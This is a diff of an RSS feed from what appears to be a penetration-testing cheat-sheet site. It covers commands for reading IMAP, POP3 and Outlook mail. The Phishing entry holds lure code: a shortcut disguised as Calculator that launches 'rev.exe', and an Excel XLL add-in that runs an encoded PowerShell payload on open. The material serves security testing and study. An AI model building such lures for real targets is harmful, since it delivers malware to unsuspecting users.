@@ -12,28 +12,28 @@
       <link>https://tldrbins.github.io/imap/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/imap/</guid>
-      <description> IMAP/IMAPS # Connect to IMAP over ssl rlwrap openssl s_client -connect 10.10.11.10:993 # Login a LOGIN &amp;lt;USER&amp;gt; &amp;lt;PASSWORD&amp;gt; # List all mailboxes a LIST &amp;#34;&amp;#34; &amp;#34;*&amp;#34; # Select a mailbox (e.g. Inbox) a SELECT INBOX # Get mail from mailbox (e.g. #1) a FETCH 1 BODY.PEEK[] </description>
+      <description>IMAP/IMAPS # Connect to IMAP over ssl rlwrap openssl s_client -connect &amp;lt;TARGET&amp;gt;:993 # Login a LOGIN &amp;lt;USER&amp;gt; &amp;lt;PASSWORD&amp;gt; # List all mailboxes a LIST &amp;#34;&amp;#34; &amp;#34;*&amp;#34; # Select a mailbox (e.g. Inbox) a SELECT INBOX # Get mail from mailbox (e.g. #1) a FETCH 1 BODY.PEEK[] </description>
     </item>
     <item>
       <title>Microsoft Oulook Email Folder</title>
       <link>https://tldrbins.github.io/microsoft_outlook/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/microsoft_outlook/</guid>
-      <description>Open email file .pst .msg Tools sudo apt install readpst Basic # Convert to mbox format readpst emails.pst # Open .mbox (plaintext) cat emails.mbox Read many emails # Install mutt sudo apt install mutt # Open in mutt terminal mutt -Rf emails.mbox +--------------------------------------+ | Note: Answer No to create /root/Mail | | | | Arrow : Move to the email | | Enter : View email | | q : back | | q again : quit | +--------------------------------------+ Tools # Install msgconvert sudo apt install libemail-outlook-message-perl # Install formail sudo apt install procmail Basic # Convert to .</description>
+      <description>Open email file .pst .msg Tools sudo apt install readpst Basic # Convert to mbox format readpst &amp;lt;PST_FILE&amp;gt; # Open .mbox (plaintext) cat &amp;lt;MBOX_FILE&amp;gt; Read many emails # Install mutt sudo apt install mutt # Open in mutt terminal mutt -Rf &amp;lt;MBOX_FILE&amp;gt; +--------------------------------------+ | Note: Answer No to create /root/Mail | | | | Arrow : Move to the email | | Enter : View email | | q : back | | q again : quit | +--------------------------------------+ Tools # Install msgconvert sudo apt install libemail-outlook-message-perl # Install formail sudo apt install procmail Basic # Convert to .</description>
     </item>
     <item>
       <title>Phishing</title>
       <link>https://tldrbins.github.io/phishing/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/phishing/</guid>
-      <description>lnk xll hta scf odt pdf others $obj = New-Object -ComObject WScript.Shell $link = $obj.CreateShortcut(&amp;#34;C:\ProgramData\Calculator.lnk&amp;#34;) $link.TargetPath = &amp;#34;C:\ProgramData\rev.exe&amp;#34; $link.Save() shell.c #include &amp;lt;windows.h&amp;gt; __declspec(dllexport) void __cdecl xlAutoOpen(void); void __cdecl xlAutoOpen() { // Triggers when Excel opens WinExec(&amp;#34;&amp;lt;PowerShell #3 Base64 Payload&amp;gt;&amp;#34;, 1); // Replace your payload } BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ) { switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; } return TRUE; } 1.</description>
+      <description>lnk xll hta scf odt pdf others $obj = New-Object -ComObject WScript.Shell $link = $obj.CreateShortcut(&amp;#34;C:\ProgramData\Calculator.lnk&amp;#34;) $link.TargetPath = &amp;#34;C:\ProgramData\rev.exe&amp;#34; $link.Save() shell.c #include &amp;lt;windows.h&amp;gt; __declspec(dllexport) void __cdecl xlAutoOpen(void); void __cdecl xlAutoOpen() { // Triggers when Excel opens WinExec(&amp;#34;&amp;lt;POWERSHELL_3_BASE64&amp;gt;&amp;#34;, 1); // Replace your payload } BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ) { switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; } return TRUE; } 1.</description>
     </item>
     <item>
       <title>POP3</title>
       <link>https://tldrbins.github.io/pop3/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/pop3/</guid>
-      <description> Basic # Connect to POP3 mail server telnet 10.10.11.10 110 # Send cmd after +OK USER &amp;lt;USER&amp;gt; PASS &amp;lt;PASSWORD&amp;gt; # List all mails LIST # Retrieve mail #1 RETR 1 # Exit Ctrl + ], then quit </description>
+      <description>Basic # Connect to POP3 mail server telnet &amp;lt;TARGET&amp;gt; 110 # Send cmd after +OK USER &amp;lt;USER&amp;gt; PASS &amp;lt;PASSWORD&amp;gt; # List all mails LIST # Retrieve mail #1 RETR 1 # Exit Ctrl + ], then quit </description>
     </item>
     <item>
       <title>SMTP</title>
